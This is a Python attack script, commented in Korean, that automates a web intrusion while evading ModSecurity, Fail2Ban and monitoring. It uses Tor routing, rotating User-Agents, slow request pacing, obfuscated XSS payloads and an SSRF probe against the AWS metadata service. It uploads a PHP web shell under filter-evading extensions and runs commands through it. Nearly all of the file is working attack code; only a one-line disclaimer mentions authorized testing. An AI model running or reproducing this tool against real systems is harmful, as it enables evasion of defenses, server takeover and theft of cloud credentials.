#!/usr/bin/env python3
"""
BlueTeam Defense Bypass - WAF/Fail2Ban/IDS 우회 공격

시나리오:
  완벽한 방어 시스템 (ModSecurity WAF + Fail2Ban + Splunk + 모니터링)
  BUT... 느린 속도 + 정상 트래픽 위장으로 우회 가능

공격 경로:
  1. Fail2Ban 우회 (느린 요청 + 정상 User-Agent)
  2. ModSecurity 우회 (인코딩 + 난독화)
  3. 웹쉘 업로드 → RCE → 서버 장악

작성자: RedChain Framework
작성일: 2025-11-30
"""

import requests
import json
import sys
import os
import time
import urllib.parse
import base64
import random
from datetime import datetime

class BlueTeamBypass:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"

        # Tor 프록시 설정 (환경 변수로 제어)
        self.session = requests.Session()
        use_tor = os.environ.get('DISABLE_TOR') != '1'

        if use_tor:
            self.session.proxies = {
                'http': 'socks5h://127.0.0.1:9050',
                'https': 'socks5h://127.0.0.1:9050'
            }

        # 정상 브라우저 User-Agent (Fail2Ban 우회)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        # Fail2Ban 우회를 위한 최소 요청 간격 (초)
        self.min_delay = 35  # profile_dos는 20초에 10회 차단하므로 35초 간격

        self.webshell_url = None
        self.session_cookies = None

    def print_banner(self):
        print("╔" + "═"*68 + "╗")
        print("║" + " "*68 + "║")
        print("║" + "  🛡️  BlueTeam Defense Bypass Attack".center(76) + "║")
        print("║" + " "*68 + "║")
        print("║" + f"  타겟: {self.base_url}".ljust(76) + "║")
        print("║" + f"  시간: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}".ljust(76) + "║")
        print("║" + " "*68 + "║")
        print("╚" + "═"*68 + "╝")
        print()

    def safe_request(self, method, url, **kwargs):
        """Fail2Ban 우회를 위한 안전한 요청"""
        print(f"[*] 요청 대기 중... ({self.min_delay}초 간격으로 Fail2Ban 우회)")
        time.sleep(self.min_delay)

        # User-Agent 랜덤 변경
        self.session.headers['User-Agent'] = random.choice(self.user_agents)

        try:
            if method.upper() == 'GET':
                return self.session.get(url, timeout=30, **kwargs)
            elif method.upper() == 'POST':
                return self.session.post(url, timeout=30, **kwargs)
        except requests.exceptions.RequestException as e:
            print(f"[-] 요청 실패: {e}")
            return None

    def check_target(self):
        """타겟 서버 확인"""
        print("[1] 타겟 서버 확인 중...")

        try:
            response = self.safe_request('GET', self.base_url)
            if response and response.status_code == 200:
                print(f"[+] 서버 응답: HTTP {response.status_code}")
                return True
            else:
                print(f"[-] 서버 접근 실패: {response.status_code if response else 'No response'}")
                return False
        except Exception as e:
            print(f"[-] 연결 실패: {e}")
            return False

    def enumerate_endpoints(self):
        """엔드포인트 열거 (느린 속도로 Fail2Ban 우회)"""
        print("\n[2] 엔드포인트 스캔 중 (Fail2Ban 우회 모드)...")

        endpoints = [
            '/login.php',
            '/upload.php',
            '/profile.php',
            '/new_post.php',
            '/admin.php',
            '/api/health.php',
            '/www/api/health.php'
        ]

        found_endpoints = []

        for endpoint in endpoints:
            url = self.base_url + endpoint
            print(f"[*] 스캔: {endpoint}")

            response = self.safe_request('GET', url)

            if response:
                if response.status_code == 200:
                    print(f"[+] 발견: {endpoint} (HTTP {response.status_code})")
                    found_endpoints.append(endpoint)
                elif response.status_code == 302:
                    print(f"[+] 발견: {endpoint} (Redirect)")
                    found_endpoints.append(endpoint)
                else:
                    print(f"[-] 없음: {endpoint} (HTTP {response.status_code})")

        return found_endpoints

    def test_xss(self, endpoint):
        """XSS 취약점 테스트 (난독화로 WAF 우회)"""
        print(f"\n[3] XSS 테스트: {endpoint}")

        # ModSecurity 우회 XSS 페이로드들
        payloads = [
            # HTML 엔티티 인코딩
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            # 대소문자 혼합
            '<ScRiPt>alert(1)</ScRiPt>',
            # null byte 삽입
            '<script\x00>alert(1)</script>',
            # 이벤트 핸들러
            '<img src=x onerror=alert(1)>',
            # SVG 기반
            '<svg/onload=alert(1)>',
        ]

        for payload in payloads:
            print(f"[*] 페이로드 테스트: {payload[:30]}...")

            # URL 파라미터로 테스트
            url = self.base_url + endpoint
            params = {'q': payload, 'search': payload, 'content': payload}

            response = self.safe_request('GET', url, params=params)

            if response and payload in response.text:
                print(f"[+] XSS 취약점 발견! 페이로드가 반영됨")
                return True

        print("[-] XSS 취약점 없음 또는 WAF 차단")
        return False

    def test_file_upload(self, endpoint):
        """파일 업로드 취약점 테스트"""
        print(f"\n[4] 파일 업로드 테스트: {endpoint}")

        # 간단한 웹쉘 (PHP)
        webshell_content = """<?php
if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>"""

        # 다양한 확장자로 우회 시도
        extensions = ['.php', '.phtml', '.php5', '.php7', '.phar']

        for ext in extensions:
            filename = f"test_{random.randint(1000,9999)}{ext}"

            print(f"[*] 업로드 시도: {filename}")

            files = {
                'file': (filename, webshell_content, 'application/x-php'),
                'upload': (filename, webshell_content, 'text/plain')
            }

            url = self.base_url + endpoint
            response = self.safe_request('POST', url, files=files)

            if response and response.status_code == 200:
                print(f"[+] 업로드 성공 가능성: {filename}")

                # 업로드된 파일 찾기
                upload_paths = [
                    f'/uploads/{filename}',
                    f'/files/{filename}',
                    f'/upload/{filename}',
                    f'/www/uploads/{filename}'
                ]

                for path in upload_paths:
                    test_url = self.base_url + path
                    test_response = self.safe_request('GET', test_url)

                    if test_response and test_response.status_code == 200:
                        print(f"[+] 웹쉘 발견: {test_url}")
                        self.webshell_url = test_url
                        return True

        print("[-] 파일 업로드 차단됨 또는 실패")
        return False

    def exploit_health_endpoint(self):
        """health.php 엔드포인트 악용"""
        print("\n[5] health.php ModSecurity 예외 악용...")

        # /api/health.php 시도
        endpoints = ['/api/health.php', '/www/api/health.php']

        for endpoint in endpoints:
            url = self.base_url + endpoint
            print(f"[*] 테스트: {endpoint}")

            # 기본 응답 확인
            response = self.safe_request('GET', url)

            if response and response.status_code == 200:
                print(f"[+] 접근 가능: {endpoint}")

                try:
                    data = response.json()
                    print(f"[+] 응답: {json.dumps(data, indent=2)}")

                    # SSRF 테스트
                    print("[*] SSRF 테스트 중...")
                    ssrf_url = url + "?check=metadata&url=http://169.254.169.254/latest/meta-data/instance-id"
                    ssrf_response = self.safe_request('GET', ssrf_url)

                    if ssrf_response:
                        print(f"[+] SSRF 응답: {ssrf_response.text[:200]}")

                        if 'i-' in ssrf_response.text:
                            print("[+] AWS IMDS 접근 성공!")
                            return True

                except json.JSONDecodeError:
                    print("[-] JSON 파싱 실패")

        print("[-] health.php 엔드포인트 악용 실패")
        return False

    def execute_webshell(self, cmd):
        """웹쉘을 통한 명령 실행"""
        if not self.webshell_url:
            print("[-] 웹쉘이 없습니다")
            return None

        print(f"[*] 명령 실행: {cmd}")

        url = f"{self.webshell_url}?cmd={urllib.parse.quote(cmd)}"
        response = self.safe_request('GET', url)

        if response:
            print(f"[+] 결과:\n{response.text}")
            return response.text

        return None

    def run(self):
        """전체 공격 실행"""
        self.print_banner()

        print("=" * 70)
        print("🎯 BlueTeam 방어 시스템 우회 공격 시작")
        print("=" * 70)
        print()
        print("⚠️  이 도구는 교육 및 합법적 침투 테스트 목적으로만 사용하세요")
        print("⚠️  무단 사용은 법적 책임을 질 수 있습니다")
        print()
        print("=" * 70)
        print()

        # 1단계: 타겟 확인
        if not self.check_target():
            print("\n[-] 타겟에 접근할 수 없습니다")
            return False

        # 2단계: 엔드포인트 열거
        endpoints = self.enumerate_endpoints()

        if not endpoints:
            print("\n[-] 접근 가능한 엔드포인트가 없습니다")
            return False

        print(f"\n[+] 발견된 엔드포인트: {len(endpoints)}개")

        # 3단계: health.php 우선 공격
        if '/api/health.php' in endpoints or '/www/api/health.php' in endpoints:
            if self.exploit_health_endpoint():
                print("\n[+] 공격 성공! health.php를 통한 IMDS 접근")
                return True

        # 4단계: XSS 테스트
        for endpoint in endpoints:
            if 'post' in endpoint or 'search' in endpoint or 'profile' in endpoint:
                if self.test_xss(endpoint):
                    print(f"\n[+] XSS 취약점 발견: {endpoint}")

        # 5단계: 파일 업로드 테스트
        for endpoint in endpoints:
            if 'upload' in endpoint or 'post' in endpoint or 'profile' in endpoint:
                if self.test_file_upload(endpoint):
                    print(f"\n[+] 파일 업로드 성공: {endpoint}")

                    # 웹쉘 테스트
                    print("\n[6] 웹쉘 테스트...")
                    self.execute_webshell('whoami')
                    self.execute_webshell('id')
                    self.execute_webshell('pwd')

                    print("\n[+] 서버 장악 성공!")
                    return True

        print("\n[-] 모든 공격 실패")
        return False


def main():
    if len(sys.argv) != 2:
        print("사용법: python3 blueteam_bypass.py <target_ip>")
        print("예제: python3 blueteam_bypass.py 13.125.80.75")
        sys.exit(1)

    target = sys.argv[1]

    print()
    print("=" * 70)
    print("BlueTeam Defense Bypass Attack Framework".center(70))
    print("=" * 70)
    print()

    exploit = BlueTeamBypass(target)
    exploit.run()


if __name__ == "__main__":
    main()
